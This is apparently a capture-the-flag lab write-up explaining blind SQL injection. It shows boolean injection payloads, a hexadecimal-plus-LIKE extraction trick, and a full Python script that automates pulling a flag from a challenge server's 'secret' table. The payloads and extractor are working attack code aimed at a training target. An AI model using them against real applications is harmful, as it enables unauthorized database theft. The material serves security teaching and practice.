## Blind SQL Injection Automation and Oracle Construction

### Infiltrating Opaque Database Environments

The laboratory exercise now progresses to a practical implementation of **Blind SQL Injection**, a scenario where the application interface does not render the complete output of a database query, returning only binary indicators of success or failure. In this constrained environment, the database server functions analogously to a cryptographic oracle, capable of evaluating strictly boolean propositions. By submitting a sequence of true or false interrogations, such as verifying if a specific character resides at a designated index within a hidden string, an attacker can systematically reconstruct the targeted information one piece at a time.

To operationalize this extraction technique, the exploitation strategy relies on formulating an algorithmic approach that iteratively tests potential characters against the unknown string. The core vulnerability is exploited by injecting a payload designed to execute arbitrary `SELECT` statements while simultaneously revealing their boolean evaluation through the application response. A foundational payload structure utilized for this purpose is demonstrated as follows.



```SQL
1' AND (SELECT 1 WHERE 1=1)='1
```

With this specific injection, the overall success of the query becomes entirely dependent on the conditional statement following the `WHERE` clause, allowing an attacker to substitute `1=1` with arbitrary data interrogations.

### Optimizing Extraction with Hexadecimal Encoding

When the specific character set comprising the target data is unknown, optimizing the extraction process becomes critical to reduce the total number of required HTTP requests. A highly effective optimization strategy involves instructing the database engine to encode the target data into a hexadecimal format prior to evaluation. This transformation significantly narrows the required search space to a highly predictable dictionary consisting of only sixteen characters, specifically the numeric digits zero through nine and the alphabetic characters A through F.

To facilitate these partial string evaluations, the SQL `LIKE` operator is employed. For practitioners requiring a foundational understanding of this operator, the educational resource available at [https://www.w3schools.com/sql/sql_like.asp](https://www.w3schools.com/sql/sql_like.asp) provides comprehensive documentation on its behavior and syntax. By combining hexadecimal encoding with the `LIKE` operator, a precise interrogation can be constructed, asking the oracle if the first character of the hexadecimal representation of a secret string matches a specific value.

```SQL
1' AND (SELECT 1 WHERE HEX('SECRET') LIKE '0%')='1
```

The inclusion of the `%` wildcard character immediately following the guessed value is an absolute necessity, as it instructs the database engine to match any subsequent sequence of characters, thereby validating the presence of the targeted character at that specific position.

### Automating the Exploitation Process

The final phase of the laboratory entails automating the extraction of a hidden flag residing within the `asecret` column of the `secret` table. The designated target environment for this automated extraction is hosted at [http://web-17.challs.olicyber.it](http://web-17.challs.olicyber.it/). The manual execution of these interrogations is highly inefficient, necessitating the development of an automated script to handle the iterative guessing process. The algorithm requires nested loops, where an outer loop iterates through the successive positions of the target string, while an inner loop sequentially tests every possible hexadecimal character against the current position. Because the `LIKE` operator evaluates conditions in a case insensitive manner, the capitalization of the hexadecimal dictionary is irrelevant.

The complete implementation of this automated extraction logic, aggregating the conceptual snippets provided in the laboratory instructions, is detailed in the following code block.



```Python
import requests

class Inj:
    def __init__(self, host):
        self.sess = requests.Session()
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        return self.sess.post(url, json=data, headers=headers).json()

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response.get('result'), response.get('sql_error')

inj = Inj('http://web-17.challs.olicyber.it')
dictionary = '0123456789abcdef'
result = ''

while True:
    for c in dictionary:
        question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
        print(f"Testing payload: {result+c}", end='\r')
        response, error = inj.blind(question)
        
        if response == 'Success':
            result += c
            print(f"\nMatch found, current hex: {result}")
            break
    else:
        break

if result:
    print(bytes.fromhex(result).decode('utf-8'))
else:
    print("No data extracted.")
```

> The fundamental transition from manual observation to automated boolean inference highlights the true severity of blind SQL injection vulnerabilities, demonstrating how trivial true or false discrepancies can be systematically leveraged to achieve total data compromise.
